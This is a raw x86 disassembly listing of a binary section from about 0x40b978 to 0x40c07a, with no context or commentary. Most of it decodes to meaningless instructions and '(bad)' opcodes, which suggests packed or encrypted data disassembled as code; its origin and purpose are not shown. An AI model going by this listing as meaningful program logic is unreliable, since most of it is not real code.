  40b978:	and    BYTE PTR [edi-0x49dc3234],bh
  40b97e:	repnz (bad) 
  40b980:	out    0x6b,eax
  40b982:	pop    edi
  40b983:	jl     0x40b968
  40b985:	rcl    BYTE PTR [eax+edi*8+0x17],1
  40b989:	push   esi
  40b98a:	into   
  40b98b:	(bad)  
  40b98c:	jle    0x40b93d
  40b98e:	and    ebp,DWORD PTR [esi-0x74]
  40b991:	lea    esi,[ebx+0x6c]
  40b994:	retf   0x4da2
  40b997:	mov    bl,0x3e
  40b999:	fwait
  40b99a:	sbb    DWORD PTR [ebx+ebx*1-0x7c965a8],edx
  40b9a1:	xor    DWORD PTR [ebp+0x45],ecx
  40b9a4:	inc    esp
  40b9a5:	jecxz  0x40ba01
  40b9a7:	scas   al,BYTE PTR es:[edi]
  40b9a8:	cld    
  40b9a9:	mov    eax,ds:0xc6e063a1
  40b9ae:	sub    ah,ah
  40b9b0:	cmp    al,0x39
  40b9b2:	lock xor al,0x13
  40b9b5:	test   al,0x62
  40b9b7:	mov    cl,cl
  40b9b9:	lods   al,BYTE PTR ds:[esi]
  40b9ba:	cmp    eax,0xae6fbedc
  40b9bf:	inc    esp
  40b9c0:	out    dx,al
  40b9c1:	adc    bl,BYTE PTR [ebx]
  40b9c3:	inc    esi
  40b9c4:	out    dx,al
  40b9c5:	cdq    
  40b9c6:	sub    eax,0x30dde340
  40b9cb:	inc    eax
  40b9cc:	icebp  
  40b9cd:	in     al,dx
  40b9ce:	out    0x5f,al
  40b9d0:	inc    BYTE PTR [ebp+0x63]
  40b9d3:	stos   DWORD PTR es:[edi],eax
  40b9d4:	cdq    
  40b9d5:	and    al,0xa0
  40b9d7:	bswap  edi
  40b9d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9da:	or     BYTE PTR [esi],dl
  40b9dc:	push   edi
  40b9dd:	mov    esi,0xd2cccfc8
  40b9e2:	stc    
  40b9e3:	arpl   WORD PTR [edx+edx*1-0x31],ax
  40b9e7:	je     0x40ba59
  40b9e9:	int    0x31
  40b9eb:	mov    bl,0x4a
  40b9ed:	xchg   DWORD PTR [edi],esi
  40b9ef:	xor    DWORD PTR [eax-0x2a42d222],esp
  40b9f5:	add    bh,BYTE PTR [ecx]
  40b9f7:	out    dx,al
  40b9f8:	push   ebp
  40b9f9:	pop    ecx
  40b9fa:	mov    WORD PTR [ebx-0x1],?
  40b9fd:	inc    eax
  40b9fe:	cmp    DWORD PTR [edi-0x26591850],esi
  40ba04:	xlat   BYTE PTR ds:[ebx]
  40ba05:	jle    0x40b9e5
  40ba07:	ret    0x130b
  40ba0a:	fsubp  st(1),st
  40ba0c:	mov    eax,ds:0xe19019f7
  40ba11:	xor    al,0xbe
  40ba13:	int    0xfe
  40ba15:	out    dx,eax
  40ba16:	add    eax,DWORD PTR [edi]
  40ba18:	bnd ja 0x40ba6f
  40ba1b:	popf   
  40ba1c:	mov    ebp,0x8e77a299
  40ba21:	iret   
  40ba22:	fstp   DWORD PTR [ebx+0x401966f7]
  40ba28:	popa   
  40ba29:	mov    bh,0x12
  40ba2b:	sub    BYTE PTR [esi],bh
  40ba2d:	xchg   DWORD PTR [ecx],esp
  40ba2f:	xor    eax,0x21cf85fc
  40ba34:	inc    edi
  40ba35:	cmp    ebp,DWORD PTR [ecx-0x4e]
  40ba38:	sbb    eax,0xa3c589ec
  40ba3d:	shl    BYTE PTR [ebx],1
  40ba3f:	xlat   BYTE PTR ds:[ebx]
  40ba40:	(bad)  [ebx+0x1e523a2c]
  40ba46:	lea    ecx,[esi]
  40ba48:	or     eax,0x8f8f1505
  40ba4d:	pop    edx
  40ba4e:	pop    eax
  40ba4f:	popf   
  40ba50:	sete   BYTE PTR [ecx]
  40ba53:	jnp    0x40b9ec
  40ba55:	pop    esp
  40ba56:	jae    0x40bacd
  40ba58:	or     dl,ch
  40ba5a:	inc    esi
  40ba5b:	mov    esi,0x82336186
  40ba60:	adc    BYTE PTR [edi],ch
  40ba62:	push   eax
  40ba63:	ins    BYTE PTR es:[edi],dx
  40ba64:	daa    
  40ba65:	cli    
  40ba66:	mov    al,0x6c
  40ba68:	and    al,0x8
  40ba6a:	std    
  40ba6b:	add    DWORD PTR [edi+0x6e0c9b07],ebp
  40ba71:	and    esp,DWORD PTR [ebx]
  40ba73:	mov    WORD PTR [ebp+eiz*2-0x2d],fs
  40ba77:	(bad)  
  40ba78:	leave  
  40ba79:	mov    ah,ch
  40ba7b:	sbb    eax,0x9ee9437f
  40ba80:	ret    0xfd3d
  40ba83:	pop    ss
  40ba84:	sbb    DWORD PTR [ecx-0x23],edi
  40ba87:	xchg   edx,eax
  40ba88:	cld    
  40ba89:	adc    cl,BYTE PTR [edx]
  40ba8b:	(bad)  
  40ba8c:	jg     0x40ba51
  40ba8e:	push   eax
  40ba8f:	push   0x17
  40ba91:	enter  0x2c6,0xdb
  40ba95:	xor    dl,BYTE PTR [edx+0x6d]
  40ba98:	mov    ds:0x91de999f,al
  40ba9d:	cmp    edx,DWORD PTR [ebx]
  40ba9f:	out    dx,al
  40baa0:	and    edi,esp
  40baa2:	adc    bh,BYTE PTR [ebp+0x58]
  40baa5:	scas   eax,DWORD PTR es:[edi]
  40baa6:	dec    esi
  40baa7:	jo     0x40ba93
  40baa9:	jmp    0x4076:0xfa145943
  40bab0:	pop    ss
  40bab1:	das    
  40bab2:	pop    ecx
  40bab3:	jmp    0xa83b1435
  40bab8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bab9:	add    al,0x9c
  40babb:	and    bl,bh
  40babd:	pop    ebx
  40babe:	in     eax,dx
  40babf:	(bad)  
  40bac0:	lds    ebx,FWORD PTR ds:0xefd5ac0
  40bac6:	add    al,0xa5
  40bac8:	pop    ss
  40bac9:	sbb    dh,BYTE PTR [eax+0x69]
  40bacc:	xchg   esp,eax
  40bacd:	push   edx
  40bace:	scas   al,BYTE PTR es:[edi]
  40bacf:	jg     0x40bb4b
  40bad1:	xchg   ebp,eax
  40bad2:	push   ds
  40bad3:	(bad)  
  40bad4:	in     al,0xf7
  40bad6:	inc    esi
  40bad7:	les    ecx,FWORD PTR [eax+eiz*1+0x63]
  40badb:	xchg   edx,eax
  40badc:	mov    es,WORD PTR [ebx+ebx*1-0x79]
  40bae0:	push   edx
  40bae1:	xlat   BYTE PTR ds:[ebx]
  40bae2:	xchg   esi,eax
  40bae3:	mov    esi,0x2fab0642
  40bae8:	sbb    ebx,DWORD PTR [ebx-0x42542f77]
  40baee:	(bad)  
  40baef:	into   
  40baf0:	push   esp
  40baf1:	mov    dh,0x89
  40baf3:	rcl    BYTE PTR [edi],0x36
  40baf6:	lahf   
  40baf7:	cmp    ch,bh
  40baf9:	add    ebp,DWORD PTR [edi-0x1b930b37]
  40baff:	loopne 0x40bad4
  40bb01:	mov    ch,0xb5
  40bb03:	jg     0x40ba87
  40bb05:	cmp    eax,0xc535b423
  40bb0a:	jge    0x40bb8a
  40bb0c:	in     eax,0x5c
  40bb0e:	popf   
  40bb0f:	call   0x2f04:0x34a971b
  40bb16:	lds    ecx,FWORD PTR [edi]
  40bb18:	mov    ecx,0xd5ef324b
  40bb1d:	or     BYTE PTR [esi+esi*1-0x1e],bh
  40bb21:	out    0x71,al
  40bb23:	cmp    al,0xdf
  40bb25:	data16 xlat BYTE PTR ds:[ebx]
  40bb27:	inc    esi
  40bb28:	ins    BYTE PTR es:[edi],dx
  40bb29:	js     0x40bb90
  40bb2b:	ret    
  40bb2c:	sti    
  40bb2d:	nop
  40bb2e:	xor    eax,0xb4404846
  40bb33:	cli    
  40bb34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb35:	lds    ecx,FWORD PTR ds:0xf619f5a2
  40bb3b:	test   DWORD PTR [edx],0xc26cedac
  40bb41:	test   bl,cl
  40bb43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb44:	dec    eax
  40bb45:	push   edi
  40bb46:	mov    edi,0xa5b6618
  40bb4b:	ds fdiv st(1),st
  40bb4e:	int3   
  40bb4f:	nop
  40bb50:	test   DWORD PTR [edx-0x57a719aa],ebp
  40bb56:	jno    0x40bb3a
  40bb58:	jae    0x40bb7a
  40bb5a:	mov    cl,0x87
  40bb5c:	sahf   
  40bb5d:	xchg   edx,eax
  40bb5e:	xor    ah,dh
  40bb60:	xor    esp,DWORD PTR [esi+0x65d07450]
  40bb66:	es loope 0x40bb94
  40bb69:	pop    ss
  40bb6a:	pushf  
  40bb6b:	les    ebp,FWORD PTR [ebx-0x6f]
  40bb6e:	cmp    DWORD PTR [ebp+0x27caa30f],edi
  40bb74:	add    ah,bh
  40bb76:	mov    ebp,0x6c676282
  40bb7b:	ss pusha 
  40bb7d:	xchg   DWORD PTR [esi+0x10],edx
  40bb80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb81:	aas    
  40bb82:	popf   
  40bb83:	lock sub bh,al
  40bb86:	or     esp,DWORD PTR [ebx]
  40bb88:	inc    ecx
  40bb89:	iret   
  40bb8a:	fsub   st,st(6)
  40bb8c:	in     eax,0xea
  40bb8e:	xchg   esp,eax
  40bb8f:	push   ecx
  40bb90:	xchg   ecx,eax
  40bb91:	lods   al,BYTE PTR ds:[esi]
  40bb92:	je     0x40bb6a
  40bb94:	fwait
  40bb95:	std    
  40bb96:	ror    ebx,1
  40bb98:	sbb    al,0x2d
  40bb9a:	cmp    eax,0xc744a76c
  40bb9f:	pusha  
  40bba0:	fcom   st(1)
  40bba2:	stos   BYTE PTR es:[edi],al
  40bba3:	shr    DWORD PTR [edi],cl
  40bba5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bba6:	cli    
  40bba7:	scas   al,BYTE PTR es:[edi]
  40bba8:	das    
  40bba9:	(bad)  
  40bbaa:	aad    0xb3
  40bbac:	std    
  40bbad:	adc    esp,esi
  40bbaf:	lds    edx,FWORD PTR [esi+0x34f3de53]
  40bbb5:	jne    0x40bbc8
  40bbb7:	inc    ebx
  40bbb8:	mov    edx,edi
  40bbba:	cwde   
  40bbbb:	leave  
  40bbbc:	push   cs
  40bbbd:	jecxz  0x40bc27
  40bbbf:	sahf   
  40bbc0:	je     0x40bbd8
  40bbc2:	mov    al,ds:0xf7e8bebe
  40bbc7:	push   0x56328215
  40bbcc:	and    eax,0xb6a8ad47
  40bbd1:	mov    ebp,esp
  40bbd3:	cmp    al,0xb7
  40bbd5:	ds jne 0x40bc30
  40bbd8:	out    0x4f,al
  40bbda:	jbe    0x40bc2e
  40bbdc:	dec    ebp
  40bbdd:	cmp    DWORD PTR [edi],ecx
  40bbdf:	jno    0x40bb6d
  40bbe1:	lea    edx,[esi-0x76]
  40bbe4:	mov    al,ds:0xf15fc3c7
  40bbe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbea:	xor    eax,0x742c5268
  40bbef:	jmp    0x55ca:0x57192dc0
  40bbf6:	popf   
  40bbf7:	adc    DWORD PTR [edi+eiz*8-0x35],ecx
  40bbfb:	cmp    ebp,eax
  40bbfd:	jbe    0x40bc6b
  40bbff:	inc    edx
  40bc00:	icebp  
  40bc01:	in     eax,dx
  40bc02:	cdq    
  40bc03:	mov    bl,0xcb
  40bc05:	outs   dx,DWORD PTR ds:[esi]
  40bc06:	adc    edx,DWORD PTR [edi]
  40bc08:	mov    eax,ds:0xc8a19264
  40bc0d:	jnp    0x40bc4a
  40bc0f:	sbb    dh,al
  40bc11:	(bad)  
  40bc12:	(bad)  
  40bc13:	dec    ecx
  40bc14:	lock sbb bh,BYTE PTR [edi+ecx*4-0x5c]
  40bc19:	and    BYTE PTR [edx+0x3d511d27],al
  40bc1f:	mul    BYTE PTR [ebx]
  40bc21:	test   esp,esp
  40bc23:	scas   al,BYTE PTR es:[edi]
  40bc24:	mov    eax,ds:0x7213782d
  40bc29:	sbb    DWORD PTR [edx+0x32],edx
  40bc2c:	imul   ebp,DWORD PTR [ebp-0x8db38b7],0xf684a877
  40bc36:	enter  0xe156,0xc1
  40bc3a:	lfence 
  40bc3d:	pop    esi
  40bc3e:	in     eax,dx
  40bc3f:	inc    eax
  40bc40:	jp     0x40bc0f
  40bc42:	imul   ecx,DWORD PTR [ebp+0x4414f4b2],0x55
  40bc49:	inc    ebx
  40bc4a:	ins    DWORD PTR es:[edi],dx
  40bc4b:	retf   
  40bc4c:	sub    al,BYTE PTR [edi+edx*8-0x54e1ad90]
  40bc53:	or     eax,0x9ed49039
  40bc58:	jne    0x40bc26
  40bc5a:	hlt    
  40bc5b:	adc    eax,DWORD PTR [ecx+ecx*8]
  40bc5e:	jp     0x40bc62
  40bc60:	sti    
  40bc61:	xchg   edx,eax
  40bc62:	or     al,0x6e
  40bc64:	pop    edx
  40bc65:	pop    esp
  40bc66:	and    al,0x2a
  40bc68:	ds es jnp 0x40bc65
  40bc6c:	das    
  40bc6d:	ror    ebp,0xe7
  40bc70:	mov    esi,0x747eae9e
  40bc75:	scas   al,BYTE PTR es:[edi]
  40bc76:	cmp    BYTE PTR [ebx+0x79],ch
  40bc79:	dec    ecx
  40bc7a:	cmp    BYTE PTR [edx+0x310801e6],dl
  40bc80:	pop    edi
  40bc81:	dec    ebp
  40bc82:	test   BYTE PTR [ecx],al
  40bc84:	dec    edi
  40bc85:	arpl   WORD PTR [ecx+0x2c555a62],di
  40bc8b:	cmp    al,cl
  40bc8d:	jg     0x40bc33
  40bc8f:	jp     0x40bcce
  40bc91:	lods   eax,DWORD PTR ds:[esi]
  40bc92:	add    al,0x17
  40bc94:	imul   ebx,DWORD PTR [edx+0x5bd8bf4],0x269eb2a7
  40bc9e:	outs   dx,BYTE PTR ds:[esi]
  40bc9f:	sahf   
  40bca0:	test   BYTE PTR [edi+0x201ead50],0x9
  40bca7:	pop    ebx
  40bca8:	sti    
  40bca9:	cld    
  40bcaa:	sub    ebx,edi
  40bcac:	cmp    ebx,edx
  40bcae:	mov    edx,DWORD PTR [ebp-0x38]
  40bcb1:	jbe    0x40bcba
  40bcb7:	mov    edx,DWORD PTR [ebp-0x3c]
  40bcba:	mov    edi,DWORD PTR [ebp-0x4]
  40bcbd:	xor    edi,eax
  40bcbf:	xor    edx,eax
  40bcc1:	jmp    0x40c0d8
  40bcc6:	test   DWORD PTR [ebp-0x48],ecx
  40bcc9:	rol    BYTE PTR [eax-0x33],0x8d
  40bccd:	dec    ebp
  40bcce:	pop    ecx
  40bccf:	repz ror ebx,cl
  40bcd2:	add    DWORD PTR [ebp-0x1c],ebp
  40bcd5:	ret    
  40bcd6:	in     al,0x8e
  40bcd8:	jle    0x40bd58
  40bcda:	jo     0x40bd55
  40bcdc:	jle    0x40bd5c
  40bcde:	jne    0x40bcf1
  40bce0:	into   
  40bce1:	sub    esi,ebp
  40bce3:	or     ch,BYTE PTR [ecx+0x5f]
  40bce6:	jno    0x40bc6f
  40bce8:	les    ebp,FWORD PTR [esi+ecx*8]
  40bceb:	scas   al,BYTE PTR es:[edi]
  40bcec:	mov    DWORD PTR [ebp-0x508ec4c7],0x223e8083
  40bcf6:	push   ds
  40bcf7:	jo     0x40bd1b
  40bcf9:	jle    0x40bd2e
  40bcfb:	test   DWORD PTR ds:0xcb8b92b9,ebx
  40bd01:	xchg   esp,eax
  40bd02:	stos   DWORD PTR es:[edi],eax
  40bd03:	mov    edx,0xe09dc9b0
  40bd08:	js     0x40bd4a
  40bd0a:	xchg   esi,eax
  40bd0b:	mov    ecx,0x8ae0662b
  40bd10:	aam    0x44
  40bd12:	xor    al,0x88
  40bd14:	idiv   eax
  40bd16:	pop    eax
  40bd17:	adc    BYTE PTR [esi],al
  40bd19:	lock inc ecx
  40bd1b:	jp     0x40bd14
  40bd1d:	stos   BYTE PTR es:[edi],al
  40bd1e:	rol    bh,1
  40bd20:	mov    ah,0x83
  40bd22:	sub    BYTE PTR [edx-0x5f7f5674],bh
  40bd28:	xchg   ebp,eax
  40bd29:	cmp    BYTE PTR [eax+edi*1],0xcb
  40bd2d:	or     dh,ch
  40bd2f:	inc    ecx
  40bd30:	leave  
  40bd31:	mov    ecx,ecx
  40bd33:	hlt    
  40bd34:	jo     0x40bce7
  40bd36:	std    
  40bd37:	inc    edx
  40bd38:	fcom   st(2)
  40bd3a:	ins    DWORD PTR es:[edi],dx
  40bd3b:	ror    DWORD PTR [ecx-0x53],1
  40bd3e:	fwait
  40bd3f:	icebp  
  40bd40:	test   al,0x65
  40bd42:	xor    dh,BYTE PTR [esi-0x4c2e63f]
  40bd48:	xchg   ebp,eax
  40bd49:	outs   dx,BYTE PTR ds:[esi]
  40bd4a:	jae    0x40bdb6
  40bd4c:	or     ecx,DWORD PTR ds:0xab0984c8
  40bd52:	mov    bh,0xa8
  40bd54:	call   ebp
  40bd56:	(bad)  
  40bd57:	xchg   esp,eax
  40bd58:	pop    edi
  40bd59:	inc    ebx
  40bd5a:	pop    ecx
  40bd5b:	outs   dx,BYTE PTR ds:[esi]
  40bd5c:	popa   
  40bd5d:	jns    0x40bd6e
  40bd5f:	test   DWORD PTR [edi+0x376e20be],edx
  40bd65:	out    dx,eax
  40bd66:	fscale 
  40bd68:	test   eax,0x40e2e8d3
  40bd6d:	rol    DWORD PTR [ebp-0x8064b45],cl
  40bd73:	imul   eax,DWORD PTR [ecx-0x6b],0x7989f5e5
  40bd7a:	xchg   esp,eax
  40bd7b:	xor    BYTE PTR [esi-0x438f85cf],ah
  40bd81:	pop    edi
  40bd82:	ja     0x40bd6b
  40bd84:	jnp    0x40bd61
  40bd86:	push   0x95828d06
  40bd8b:	jmp    0x99d2:0xd0bef673
  40bd92:	stos   BYTE PTR es:[edi],al
  40bd93:	pusha  
  40bd94:	xor    BYTE PTR [esi],0x62
  40bd97:	fucomp st(2)
  40bd99:	sbb    esp,esi
  40bd9b:	dec    esi
  40bd9c:	xor    dh,0xe4
  40bd9f:	add    DWORD PTR [edx+0x15],0xffffffa5
  40bda3:	mov    bl,0x7
  40bda5:	cmp    cl,BYTE PTR [ebx+0x29]
  40bda8:	ror    DWORD PTR [ebp-0x6027020b],cl
  40bdae:	aas    
  40bdaf:	mov    al,0xe1
  40bdb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdb2:	mov    esp,0x1122591a
  40bdb7:	mov    ch,0x9b
  40bdb9:	out    dx,al
  40bdba:	stc    
  40bdbb:	pop    esi
  40bdbc:	pop    ss
  40bdbd:	sar    DWORD PTR [esi+0x675dd035],0xa8
  40bdc4:	(bad)  
  40bdc6:	out    0x21,al
  40bdc8:	out    0x1f,eax
  40bdca:	xchg   esp,eax
  40bdcb:	or     al,0x6f
  40bdcd:	out    dx,eax
  40bdce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdcf:	jmp    0x9a6:0x6bba414a
  40bdd6:	in     al,dx
  40bdd7:	inc    ebp
  40bdd8:	push   ebp
  40bdd9:	push   ebx
  40bdda:	push   esp
  40bddb:	adc    eax,edx
  40bddd:	lods   eax,DWORD PTR ds:[esi]
  40bdde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bddf:	int    0xd1
  40bde1:	mov    ds:0x656aea6b,eax
  40bde6:	push   ebp
  40bde7:	jbe    0x40bd96
  40bde9:	sub    al,0x48
  40bdeb:	lock push es
  40bded:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdee:	xchg   esi,eax
  40bdef:	jmp    0x40be15
  40bdf1:	in     al,dx
  40bdf2:	ins    DWORD PTR es:[edi],dx
  40bdf3:	dec    ebx
  40bdf4:	jp     0x40bd7d
  40bdf6:	int3   
  40bdf7:	or     ecx,edi
  40bdf9:	jns    0x40be63
  40bdfb:	clc    
  40bdfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdfd:	in     eax,0xc
  40bdff:	mov    ds:0x7e002f53,al
  40be04:	cmp    BYTE PTR [ebx+0x71],bh
  40be07:	inc    ebx
  40be08:	or     bl,BYTE PTR [esi*2+0x2cb883e3]
  40be0f:	daa    
  40be10:	pop    ds
  40be11:	js     0x40be29
  40be13:	add    eax,0x4d9708e4
  40be18:	fist   WORD PTR [esi+0x7e49cfd2]
  40be1e:	jle    0x40be82
  40be20:	lock or BYTE PTR [ebx],dl
  40be23:	sub    eax,0x82cb9ca1
  40be28:	imul   edi,DWORD PTR [edi+0x4e47becd],0x27
  40be2f:	sub    bh,BYTE PTR [ebx-0x6b]
  40be32:	xchg   edx,eax
  40be33:	(bad)  
  40be34:	dec    esp
  40be35:	shr    dh,0xa8
  40be38:	js     0x40be9a
  40be3a:	imul   ebx,edx,0x5b
  40be3d:	push   ds
  40be3e:	lods   al,BYTE PTR ds:[esi]
  40be3f:	mov    edx,0xdb22c03e
  40be44:	sbb    al,0x27
  40be46:	push   esp
  40be47:	push   esp
  40be48:	retf   
  40be49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be4a:	adc    DWORD PTR [ebp+eax*1+0x44],edx
  40be4e:	cli    
  40be4f:	adc    BYTE PTR [edi+0x16],dh
  40be52:	rol    ebx,cl
  40be54:	dec    edx
  40be55:	push   edi
  40be56:	inc    esp
  40be57:	sbb    eax,0x41eea7b9
  40be5c:	dec    ebp
  40be5d:	out    0x86,eax
  40be5f:	mov    dl,0x3f
  40be61:	ss sub al,0x31
  40be64:	add    ebx,DWORD PTR [edi-0x13]
  40be67:	gs pushf 
  40be69:	inc    ebp
  40be6a:	dec    ecx
  40be6b:	adc    al,0x77
  40be6d:	pusha  
  40be6e:	pop    ebp
  40be6f:	and    DWORD PTR [esi],eax
  40be71:	std    
  40be72:	push   ds
  40be73:	and    cl,ch
  40be75:	sub    eax,0x7222277f
  40be7a:	das    
  40be7b:	adc    DWORD PTR [esi+0x7cc41ac0],eax
  40be81:	in     eax,dx
  40be82:	inc    esi
  40be83:	add    eax,0xa78f46af
  40be88:	dec    esp
  40be89:	loop   0x40be8d
  40be8b:	je     0x40be16
  40be8d:	fwait
  40be8e:	shr    BYTE PTR [edi],1
  40be90:	dec    esp
  40be91:	retf   
  40be92:	add    al,0x50
  40be94:	sub    ecx,DWORD PTR [edx+esi*8-0x3fdf7214]
  40be9b:	ins    BYTE PTR es:[edi],dx
  40be9c:	arpl   WORD PTR [edx-0x12],si
  40be9f:	push   edx
  40bea0:	fcom   DWORD PTR [ebx+0x2eccd0ff]
  40bea6:	aad    0xc8
  40bea8:	cs adc al,0x70
  40beab:	callw  0x25d3
  40beaf:	xlat   BYTE PTR ds:[ebx]
  40beb0:	mov    eax,ds:0x7ade9892
  40beb5:	mov    edi,0x9939cefa
  40beba:	addr16 mov bh,0x84
  40bebd:	outs   dx,DWORD PTR ds:[esi]
  40bebe:	sbb    bl,BYTE PTR [ecx]
  40bec0:	lods   eax,DWORD PTR ds:[esi]
  40bec1:	or     ah,0xb5
  40bec4:	std    
  40bec5:	jg     0x40be85
  40bec7:	lock ins BYTE PTR es:[edi],dx
  40bec9:	fdivp  st(5),st
  40becb:	mov    dh,0x8b
  40becd:	push   ss
  40bece:	jl     0x40bef6
  40bed0:	push   ds
  40bed1:	cli    
  40bed2:	cmp    dh,BYTE PTR [edi+0x30e29f1b]
  40bed8:	scas   al,BYTE PTR es:[edi]
  40bed9:	push   0xffffffa9
  40bedb:	jl     0x40bf5c
  40bedd:	retf   0x65b8
  40bee0:	or     DWORD PTR [edx+ebp*4],esp
  40bee3:	aam    0xf
  40bee5:	int3   
  40bee6:	hlt    
  40bee7:	jmp    0x405:0xed18dd3
  40beee:	nop
  40beef:	es sti 
  40bef1:	mov    ah,0x9c
  40bef3:	add    DWORD PTR [edi-0x72bdad3c],ebx
  40bef9:	(bad)  
  40befa:	pusha  
  40befb:	xor    al,0x1a
  40befd:	dec    ebp
  40befe:	(bad)  
  40beff:	jecxz  0x40bf41
  40bf01:	stc    
  40bf02:	js     0x40bf45
  40bf04:	addr16 retf 
  40bf06:	in     al,dx
  40bf07:	sbb    dh,dh
  40bf09:	sbb    BYTE PTR [eax],ah
  40bf0b:	ja     0x40bf22
  40bf0d:	add    edx,DWORD PTR [edx-0x38d24c65]
  40bf13:	pop    ebx
  40bf14:	fmul   DWORD PTR [edx-0x578ed299]
  40bf1a:	xor    al,0x41
  40bf1c:	mov    ecx,0x7d14b33d
  40bf21:	rcr    DWORD PTR [esi],cl
  40bf23:	push   ds
  40bf24:	inc    esp
  40bf25:	jns    0x40bf55
  40bf27:	mov    dh,ah
  40bf29:	ror    bh,1
  40bf2b:	fcom   DWORD PTR [ebx+0x750cb702]
  40bf31:	imul   eax,ecx,0x7c
  40bf34:	push   ebx
  40bf35:	(bad)  
  40bf36:	aaa    
  40bf37:	sbb    edi,0x1119a93b
  40bf3d:	ror    DWORD PTR [esi-0x30],0xe4
  40bf41:	jge    0x40bf74
  40bf43:	inc    edx
  40bf44:	and    DWORD PTR [esi+0xd],ebp
  40bf47:	or     BYTE PTR [ecx-0x26074c7e],0xa6
  40bf4e:	jmp    0x5e511fcd
  40bf53:	dec    edx
  40bf54:	pop    ecx
  40bf55:	(bad)  
  40bf56:	fld    DWORD PTR [ebx-0x56]
  40bf59:	out    0x9f,eax
  40bf5b:	sub    ecx,eax
  40bf5d:	adc    bl,BYTE PTR [ebp+0x381c2431]
  40bf63:	imul   ebp,eax,0x0
  40bf66:	push   es
  40bf67:	ins    BYTE PTR es:[edi],dx
  40bf68:	adc    DWORD PTR [edi-0x48],0x86edc332
  40bf6f:	cmp    ebx,DWORD PTR [eax-0x44]
  40bf72:	jno    0x40bf31
  40bf74:	fs inc edi
  40bf76:	jb     0x40bf23
  40bf78:	scas   al,BYTE PTR es:[edi]
  40bf79:	cmp    eax,0x2cf6552a
  40bf7e:	sub    dl,BYTE PTR [ebx]
  40bf80:	scas   eax,DWORD PTR es:[edi]
  40bf81:	xor    eax,0x9038c9b
  40bf86:	loope  0x40bf0f
  40bf88:	pop    esp
  40bf89:	mov    ch,0xb5
  40bf8b:	pop    esp
  40bf8c:	mov    eax,ds:0x40920fa
  40bf91:	scas   eax,DWORD PTR es:[edi]
  40bf92:	out    dx,eax
  40bf93:	push   ebp
  40bf94:	fisttp WORD PTR [esi+0x2a4cfb77]
  40bf9a:	or     ch,BYTE PTR [edi]
  40bf9c:	push   cs
  40bf9d:	add    BYTE PTR [ecx+0x55],ah
  40bfa0:	adc    dl,BYTE PTR [eax]
  40bfa2:	sub    BYTE PTR [ebx-0x20f00006],0x6c
  40bfa9:	dec    eax
  40bfaa:	xchg   edi,eax
  40bfab:	push   esp
  40bfac:	sbb    ch,dl
  40bfae:	std    
  40bfaf:	dec    ebx
  40bfb0:	mov    esi,0x929d0bad
  40bfb5:	pop    edi
  40bfb6:	adc    cl,dl
  40bfb8:	shl    DWORD PTR [esi+ecx*1-0x7f],cl
  40bfbc:	repz or BYTE PTR [edx-0x7be14e79],dl
  40bfc3:	push   ebx
  40bfc4:	dec    esi
  40bfc5:	mov    cl,BYTE PTR [ecx+0x12d51d4d]
  40bfcb:	sub    al,BYTE PTR [edi-0x21b677e0]
  40bfd1:	idiv   BYTE PTR [esi-0xa]
  40bfd4:	sbb    al,0x7e
  40bfd6:	mov    ds:0xa6ccb8,al
  40bfdb:	fbld   TBYTE PTR [eax]
  40bfdd:	xchg   ebp,eax
  40bfde:	mov    ch,0xa6
  40bfe0:	ds popa 
  40bfe2:	add    eax,edi
  40bfe4:	repz pop esp
  40bfe6:	fld    DWORD PTR ds:0xca6ef2a2
  40bfec:	inc    edx
  40bfed:	xlat   BYTE PTR ds:[ebx]
  40bfee:	mov    DWORD PTR [ebp+eax*8-0x4b],ebp
  40bff2:	cmp    DWORD PTR [ebx],edx
  40bff4:	sahf   
  40bff5:	outs   dx,BYTE PTR ds:[esi]
  40bff6:	xor    BYTE PTR [ebp+0x62],0x9
  40bffa:	lea    edx,[edx+0x11]
  40bffd:	sar    BYTE PTR [ebp+0x34],1
  40c000:	mov    bh,0xcc
  40c002:	iret   
  40c003:	arpl   WORD PTR [edi+0x2c],ax
  40c006:	dec    ecx
  40c007:	sub    eax,DWORD PTR [edx-0x6c]
  40c00a:	popf   
  40c00b:	mov    ds:0xf65e3f73,eax
  40c010:	adc    ebp,DWORD PTR [edi]
  40c012:	lock or eax,ebx
  40c015:	(bad)  
  40c016:	int    0x1c
  40c018:	fwait
  40c019:	mov    BYTE PTR ds:0xc0bd66e3,cl
  40c01f:	or     DWORD PTR [ecx],0xcbabb09c
  40c025:	and    BYTE PTR [esi-0x36d53e82],dh
  40c02b:	jmp    0x4f8f368a
  40c030:	imul   esp,DWORD PTR [edx+0x8],0xffffff86
  40c034:	jns    0x40c0ab
  40c036:	add    DWORD PTR [ecx],edx
  40c038:	fs jl  0x40c08b
  40c03b:	mov    dl,0xcf
  40c03d:	mov    bh,0x50
  40c03f:	sub    eax,0xfcb42950
  40c044:	fsubr  st,st(4)
  40c046:	into   
  40c047:	jno    0x40c06a
  40c049:	push   esp
  40c04a:	aaa    
  40c04b:	ja     0x40c075
  40c04d:	mov    dl,BYTE PTR [edx+0x79]
  40c050:	mov    dl,0x9c
  40c052:	sub    BYTE PTR [esi],ch
  40c054:	fidiv  DWORD PTR [esi]
  40c056:	inc    edx
  40c057:	dec    esp
  40c058:	pop    ebx
  40c059:	adc    al,dh
  40c05b:	das    
  40c05c:	rcl    DWORD PTR [eax],0x85
  40c05f:	loope  0x40c03f
  40c061:	ror    DWORD PTR [ebp+0x46],0x23
  40c065:	xchg   esi,eax
  40c066:	es ds cdq 
  40c069:	rcr    BYTE PTR [ecx+0x6d84bc43],0xd6
  40c070:	outs   dx,DWORD PTR ds:[esi]
  40c071:	cvttps2pi mm4,QWORD PTR [ebx+0x709d9588]
  40c078:	pusha  
  40c079:	xchg   ecx,eax
  40c07a:	jge    0x40c0d6
